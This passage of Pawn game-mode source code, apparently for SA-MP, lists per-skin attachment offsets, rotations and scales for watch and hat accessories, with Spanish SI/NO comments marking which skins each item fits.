	{ 0.000000, -0.008000, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.399999, 1.000000 }, // SKINID 184 || WatchType1 -
	{ 0.000000, -0.001500, 0.002000, 90.000000, 90.000000, 90.000000, 1.100000, 1.299999, 1.000000 }, // SKINID 185 || WatchType1 -
	{ 0.000000, -0.001500, 0.002000, 90.000000, 90.000000, 90.000000, 1.100000, 1.299999, 0.0 }, // SKINID 186 || WatchType1 - NO
	{ 0.000000, -0.001500, 0.002000, 90.000000, 90.000000, 90.000000, 1.100000, 1.299999, 0.0 }, // SKINID 187 || WatchType1 - NO
	{ 0.000000, -0.001500, -0.002000, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 188 || WatchType1 -
	{ 0.000000, -0.001500, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.299999, 1.000000 }, // SKINID 189 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 190 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 191 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 192 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 193 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 194 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 195 || WatchType1 -
	{ 0.000000, -0.009999, 0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 196 || WatchType1 -
	{ 0.000000, -0.009999, 0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 197 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 198 || WatchType1 -
	{ 0.000000, -0.009999, 0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 199 || WatchType1 -
	{ 0.019999, 0.001000, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 200 || WatchType1 -
	{ 0.000000, -0.008000, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 201 || WatchType1 -
	{ 0.000000, -0.008999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.350000, 1.000000 }, // SKINID 202 || WatchType1 -
	{ 0.000000, -0.008999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.350000, 0.0 }, // SKINID 203 || WatchType1 - NO
	{ 0.000000, -0.008999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.350000, 0.0 }, // SKINID 204 || WatchType1 - NO
	{ -0.009999, -0.008999, 0.000000, 90.000000, 90.000000, 90.000000, 1.100000, 1.500000, 1.000000 }, // SKINID 205 || WatchType1 -
	{ -0.009999, -0.008999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.500000, 1.000000 }, // SKINID 206 || WatchType1 -
	{ -0.009999, -0.008999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.500000, 1.000000 }, // SKINID 207 || WatchType1 -
	{ -0.009999, -0.008999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.500000, 0.0 }, // SKINID 208 || WatchType1 - NO
	{ -0.009999, -0.008999, -0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 209 || WatchType1 -
	{ -0.009999, -0.008999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 210 || WatchType1 -
	{ -0.009999, -0.004999, 0.001000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 211 || WatchType1 -
	{ -0.009999, -0.004999, 0.001000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 212 || WatchType1 - NO
	{ -0.009999, -0.004999, 0.001000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 213 || WatchType1 - NO
	{ -0.009999, -0.008999, 0.001000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 214 || WatchType1 -
	{ -0.009999, -0.008999, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 215 || WatchType1 -
	{ -0.009999, -0.008999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.100000, 1.000000 }, // SKINID 216 || WatchType1 -
	{ -0.009999, 0.001000, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 1.000000 }, // SKINID 217 || WatchType1 -
	{ -0.009999, 0.001000, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 0.0 }, // SKINID 218 || WatchType1 - NO
	{ -0.009999, 0.001000, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.500000, 0.0 }, // SKINID 219 || WatchType1 - NO
	{ 0.001000, -0.004999, 0.002000, 90.000000, 90.000000, 90.000000, 1.399999, 1.600000, 1.000000 }, // SKINID 220 || WatchType1 -
	{ 0.001000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.299999, 1.000000 }, // SKINID 221 || WatchType1 -
	{ 0.001000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.299999, 1.000000 }, // SKINID 222 || WatchType1 -
	{ 0.001000, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.100000, 1.299999, 1.000000 }, // SKINID 223 || WatchType1 -
	{ 0.001000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 224 || WatchType1 -
	{ 0.001000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 225 || WatchType1 -
	{ 0.001000, -0.009999, -0.002000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 226 || WatchType1 -
	{ 0.001000, -0.009999, -0.002000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 0.0 }, // SKINID 227 || WatchType1 - NO
	{ 0.001000, -0.009999, -0.002000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 0.0 }, // SKINID 228 || WatchType1 - NO
	{ 0.001000, -0.009999, 0.001500, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 229 || WatchType1 -
	{ 0.001000, -0.009999, 0.001500, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 230 || WatchType1 - NO
	{ -0.009999, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 231 || WatchType1 -
	{ -0.009999, -0.009999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 0.0 }, // SKINID 232 || WatchType1 - NO
	{ -0.009999, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 233 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 234 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 235 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 236 || WatchType1 -
	{ 0.000000, -0.004999, 0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 237 || WatchType1 -
	{ 0.000000, -0.004999, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 238 || WatchType1 -
	{ 0.000000, -0.004999, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 0.0 }, // SKINID 239 || WatchType1 - NO
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.100000, 1.399999, 1.000000 }, // SKINID 240 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.399999, 1.600000, 1.000000 }, // SKINID 241 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.399999, 1.600000, 1.000000 }, // SKINID 242 || WatchType1 -
	{ 0.000000, -0.012000, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.350000, 1.000000 }, // SKINID 243 || WatchType1 -
	{ 0.000000, -0.008000, -0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 244 || WatchType1 -
	{ 0.000000, -0.019999, 0.004999, 90.000000, 90.000000, 90.000000, 1.000000, 1.450000, 1.000000 }, // SKINID 245 || WatchType1 -
	{ 0.000000, -0.014999, -0.002000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 246 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.600000, 1.000000 }, // SKINID 247 || WatchType1 -
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.600000, 0.0 }, // SKINID 248 || WatchType1 - NO
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.600000, 0.0 }, // SKINID 249 || WatchType1 - NO
	{ 0.000000, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.200000, 1.600000, 1.000000 }, // SKINID 250 || WatchType1 -
	{ 0.000000, -0.004999, 0.001000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 251 || WatchType1 -
	{ 0.000000, 0.003000, 0.003000, 90.000000, 90.000000, 90.000000, 1.100000, 1.399999, 1.000000 }, // SKINID 252 || WatchType1 -
	{ 0.000000, 0.003000, 0.003000, 90.000000, 90.000000, 90.000000, 1.100000, 1.399999, 0.0 }, // SKINID 253 || WatchType1 - NO
	{ -0.009999, -0.009999, -0.004999, 90.000000, 90.000000, 90.000000, 1.350000, 1.600000, 1.000000 }, // SKINID 254 || WatchType1 -
	{ 0.000000, -0.014999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.299999, 1.000000 }, // SKINID 255 || WatchType1 -
	{ 0.000000, -0.014999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 256 || WatchType1 -
	{ 0.000000, -0.004999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 257 || WatchType1 - 
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 258 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 259 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 260 || WatchType1 - NO
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 261 || WatchType1 - NO
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 262 || WatchType1 - NO
	{ 0.000000, -0.009999, -0.002499, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 263 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.500000, 1.500000, 1.000000 }, // SKINID 264 || WatchType1 -
	{ 0.000000, 0.004999, 0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.399999, 1.000000 }, // SKINID 265 || WatchType1 -
	{ 0.000000, -0.008999, 0.002000, 90.000000, 90.000000, 90.000000, 1.000000, 1.200000, 1.000000 }, // SKINID 266 || WatchType1 -
	{ 0.000000, -0.003000, 0.009999, 90.000000, 90.000000, 90.000000, 1.000000, 1.299999, 1.000000 }, // SKINID 267 || WatchType1 -
	{ -0.029999, -0.003000, 0.000000, 90.000000, 90.000000, 90.000000, 1.100000, 1.299999, 1.000000 }, // SKINID 268 || WatchType1 -
	{ 0.000000, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.200000, 1.600000, 1.000000 }, // SKINID 269 || WatchType1 -
	{ -0.009999, -0.004999, -0.009999, 90.000000, 90.000000, 90.000000, 1.090000, 1.299999, 1.000000 }, // SKINID 270 || WatchType1 -
	{ -0.009999, -0.004999, -0.009999, 90.000000, 90.000000, 90.000000, 1.090000, 1.299999, 0.0 }, // SKINID 271 || WatchType1 - NO
	{ -0.009999, -0.004999, -0.009999, 90.000000, 90.000000, 90.000000, 1.090000, 1.299999, 0.0 }, // SKINID 272 || WatchType1 - NO
	{ -0.009999, -0.003000, 0.000000, 0.000000, 90.000000, 180.000000, 1.149999, 1.200000, 1.100000 }, // SKINID 273 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 274 || WatchType1 -
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 275 || WatchType1 -
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 276 || WatchType1 -
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 277 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 278 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 279 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 280 || WatchType1 -
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 281 || WatchType1 -
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 282 || WatchType1 -
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 283 || WatchType1 -
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 284 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 285 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 286 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 287 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 288 || WatchType1 -
	{ -0.009999, -0.003000, 0.000000, 0.000000, 90.000000, 180.000000, 1.200000, 1.299999, 1.100000 }, // SKINID 289 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 290 || WatchType1 - NO
	{ -0.019999, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 291 || WatchType1 -
	{ 0.000000, -0.004999, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 292 || WatchType1 -
	{ -0.009999, -0.009999, -0.009999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 293 || WatchType1 -
	{ -0.009999, -0.009999, -0.009999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 294 || WatchType1 - NO
	{ -0.009999, -0.009999, -0.009999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 295 || WatchType1 - NO
	{ -0.009999, -0.009999, -0.009999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 0.0 }, // SKINID 296 || WatchType1 - NO
	{ -0.009999, 0.001000, 0.004999, 90.000000, 90.000000, 90.000000, 1.299999, 1.399999, 1.000000 }, // SKINID 297 || WatchType1 -
	{ -0.019999, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 298 || WatchType1 -
	{ -0.019999, -0.009999, 0.000000, 90.000000, 90.000000, 90.000000, 1.000000, 1.000000, 0.0 } // SKINID 299 || WatchType1 - NO
};
new Float:POS_Accesorio_Gorra[300][9] = {
	{ 0.0, -0.001184, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 0 || Hat1 - NO
	{ 0.147006, -0.001184, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 1 || Hat1 - SI
	{ 0.0, -0.001184, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 2 || Hat1 - NO
	{ 0.150000, -0.009999, -0.009999, 0.000000, 0.000000, 350.000000, 1.000000, 1.100000, 1.100000 }, // SKINID 3 || Hat1 - NO
	{ 0.170000, -0.009999, -0.009999, 0.000000, 0.000000, 350.000000, 1.100000, 1.100000, 1.100000 }, // SKINID 4 || Hat1 - NO
	{ 0.170000, -0.009999, -0.009999, 0.000000, 0.000000, 350.000000, 1.100000, 1.100000, 1.100000 }, // SKINID 5 || Hat1 - NO
	{ 0.0, -0.001184, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 6 || Hat1 - NO
	{ 0.157924, 0.007884, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 7 || Hat1 - SI
	{ 0.0, 0.007884, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 8 || Hat1 - NO
	{ 0.144114, -0.004404, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 9 || Hat1 - SI
	{ 0.144114, -0.004404, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 10 || Hat1 - SI
	{ 0.144114, -0.004404, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 11 || Hat1 - SI
	{ 0.144114, -0.004404, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 12 || Hat1 - SI
	{ 0.0, -0.004404, -0.011706, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 13 || Hat1 - NO
	{ 0.157687, 0.007467, -0.001244, 0.000000, 0.000000, 0.000000, 1.116931, 1.000000, 1.096179 }, // SKINID 14 || Hat1 - SI
	{ 0.117256, -0.017124, -0.006678, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 15 || Hat1 - SI
	{ 0.0, -0.017124, -0.006678, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 16 || Hat1 - NO
	{ 0.141728, 0.004894, -0.006678, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 17 || Hat1 - SI
	{ 0.109599, -0.003742, -0.006678, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 18 || Hat1 - SI
	{ 0.0, -0.003742, -0.006678, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 19 || Hat1 - NO
	{ 0.161143, -0.003742, -0.006678, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 20 || Hat1 - SI
	{ 0.145060, 0.010652, -0.005882, 0.000000, 0.000000, 0.000000, 1.067082, 1.000000, 1.057644 }, // SKINID 21 || Hat1 - SI
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 22 || Hat1 - NO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 23 || Hat1 - NO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 24 || Hat1 - NO
	{ 0.125074, 0.010768, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.059803 }, // SKINID 25 || Hat1 - SI
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 26 || Hat1 - NO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 27 || Hat1 - NO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 28 || Hat1 - NO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 29 || Hat1 - NO
	{ 0.155565, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 30 || Hat1 - SI
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 31 || Hat1 - NO
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 32 || Hat1 - NO
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 33 || Hat1 - NO
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 34 || Hat1 - NO
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 35 || Hat1 - NO
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 36 || Hat1 - NO
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 37 || Hat1 - NO
	{ 0.0, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 38 || Hat1 - NO
	{ 0.117316, 0.000000, -0.008439, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 39 || Hat1 - SI
	{ 0.140639, -0.013137, -0.005318, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.113420 }, // SKINID 40 || Hat1 - SI
	{ 0.0, -0.013137, -0.005318, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.113420 }, // SKINID 41 || Hat1 - NO
	{ 0.119999, -0.009999, -0.009999, 0.000000, 0.000000, 340.000000, 1.000000, 1.049999, 1.100000 }, // SKINID 42 || Hat1 - NO
	{ 0.079176, 0.007249, -0.005318, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.113420 }, // SKINID 43 || Hat1 - SI
	{ 0.108785, 0.028155, -0.005318, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 0.929156 }, // SKINID 44 || Hat1 - SI
	{ 0.098622, 0.004937, -0.011623, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 45 || Hat1 - SI
	{ 0.154583, 0.015235, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 46 || Hat1 - SI
	{ 0.154583, 0.015235, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 47 || Hat1 - SI
	{ 0.167671, -0.013713, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 48 || Hat1 - SI
	{ 0.138361, 0.000096, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 49 || Hat1 - SI
	{ 0.0, 0.000096, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 50 || Hat1 - NO
	{ 0.0, 0.000096, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 51 || Hat1 - NO
	{ 0.0, 0.000096, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 52 || Hat1 - NO
	{ 0.0, 0.000096, -0.010507, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 53 || Hat1 - NO
	{ 0.126658, 0.032032, 0.000709, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.100494 }, // SKINID 54 || Hat1 - SI
	{ 0.130603, -0.008772, -0.007212, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.162167 }, // SKINID 55 || Hat1 - SI
	{ 0.130603, -0.008772, -0.007212, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.162167 }, // SKINID 56 || Hat1 - SI
	{ 0.180383, -0.003232, -0.007212, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.036939 }, // SKINID 57 || Hat1 - SI
	{ 0.125167, -0.003232, -0.004390, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 0.930845 }, // SKINID 58 || Hat1 - SI
	{ 0.173983, -0.017257, -0.009368, 4.751676, 358.352539, 346.646514, 1.000000, 1.000000, 1.000000 }, // SKINID 59 || Hat1 - SI
	{ 0.150744, -0.017257, -0.009368, 4.751676, 358.352539, 346.646514, 1.000000, 1.000000, 1.000000 }, // SKINID 60 || Hat1 - SI
	{ 0.0, -0.017257, -0.009368, 4.751676, 358.352539, 346.646514, 1.000000, 1.000000, 1.000000 }, // SKINID 61 || Hat1 - NO
	{ 0.141376, 0.002625, -0.000497, 4.751676, 358.352539, 346.646514, 1.000000, 1.000000, 1.000000 }, // SKINID 62 || Hat1 - SI
	{ 0.153904, -0.003380, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 63 || Hat1 - SI
	{ 0.129322, -0.003380, -0.009152, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 64 || Hat1 - SI
	{ 0.0, -0.003380, -0.009152, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 65 || Hat1 - NO
	{ 0.129322, 0.021090, -0.009152, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 66 || Hat1 - SI
	{ 0.0, 0.021090, -0.009152, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 67 || Hat1 - NO
	{ 0.130530, 0.021090, -0.009152, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 68 || Hat1 - SI
	{ 0.148960, -0.012263, -0.009152, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 69 || Hat1 - SI
	{ 0.148960, 0.010975, 0.000065, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 70 || Hat1 - SI
	{ 0.0, 0.010975, 0.000065, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 71 || Hat1 - NO
	{ 0.130530, 0.016904, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 72 || Hat1 - SI
	{ 0.0, 0.016904, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 73 || Hat1 - NO
	{ 0.0, 0.016904, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 74 || Hat1 - NO
	{ 0.0, 0.016904, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 75 || Hat1 - NO
	{ 0.153769, -0.012621, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 76 || Hat1 - SI
	{ 0.0, -0.012621, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 77 || Hat1 - NO
	{ 0.0, -0.012621, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 78 || Hat1 - NO
